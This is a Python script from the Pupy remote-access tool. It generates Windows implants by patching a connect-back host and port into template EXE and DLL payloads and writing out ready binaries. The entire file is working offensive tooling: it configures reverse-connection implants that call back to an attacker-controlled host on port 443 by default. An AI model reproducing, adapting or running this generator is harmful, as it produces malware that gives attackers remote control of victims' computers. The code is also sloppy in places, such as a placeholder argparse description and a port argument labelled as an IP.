#!/usr/bin/env python
# -*- coding: UTF8 -*-
# ---------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# ---------------------------------------------------------------

import argparse
import sys
import os.path
from pupylib.utils.network import get_local_ip

def get_edit_pupyx86_dll(host, ip):
	return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), host, ip)

def get_edit_pupyx64_dll(host, ip):
	return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), host, ip)

def get_edit_pupyx86_exe(host, ip):
	return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), host, ip)

def get_edit_pupyx64_exe(host, ip):
	return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), host, ip)

def get_edit_binary(path, host, ip):
	binary=b""
	with open(path, 'rb') as f:
		binary=f.read()
	i=0
	offsets=[]
	while True:
		i=binary.find("<default_connect_back_host>:<default_connect_back_port>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", i+1)
		if i==-1:
			break
		offsets.append(i)

	if not offsets:
		raise Exception("Error: the offset to edit IP:PORT have not been found")
	elif len(offsets)!=1:
		raise Exception("Error: multiple offsets to edit IP:PORT have been found")

	new_host="%s:%s\x00\x00\x00\x00"%(host,ip)
	if len(new_host)>100:
		raise Exception("Error: host too long")
	binary=binary[0:offsets[0]]+new_host+binary[offsets[0]+len(new_host):]
	return binary


if __name__=="__main__":
	parser = argparse.ArgumentParser(description='Process some integers.')
	parser.add_argument('-t', '--type', default='exe_x86', choices=['exe_x86','exe_x64','dll_x86','dll_x64'], help="(default: exe_x86)")
	parser.add_argument('-o', '--output', help="output path")
	parser.add_argument('-p', '--port', type=int, default=443, help="connect back ip (default:443)")
	parser.add_argument('host', nargs='*', help="connect back host")
	args=parser.parse_args()
	myhost=None
	if not args.host:
		myip=get_local_ip()
		if not myip:
			sys.exit("[-] couldn't find your local IP. You must precise an ip or a fqdn manually")
		myhost=myip
	else:
		myhost=args.host[0]
	
	outpath=None
	if args.type=="exe_x86":
		binary=get_edit_pupyx86_exe(myhost, args.port)
		outpath="pupyx86.exe"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="exe_x64":
		binary=get_edit_pupyx64_exe(myhost, args.port)
		outpath="pupyx64.exe"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="dll_x64":
		binary=get_edit_pupyx64_dll(myhost, args.port)
		outpath="pupyx64.dll"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="dll_x86":
		binary=get_edit_pupyx86_dll(myhost, args.port)
		outpath="pupyx86.dll"
		if args.output:
			outpath=args.output
		with open(outpath, 'wb') as w:
			w.write(binary)
	else:
		exit("Type %s is invalid."%(args.type))
	print "binary generated to %s with HOST=%s"%(outpath,(myhost, args.port))






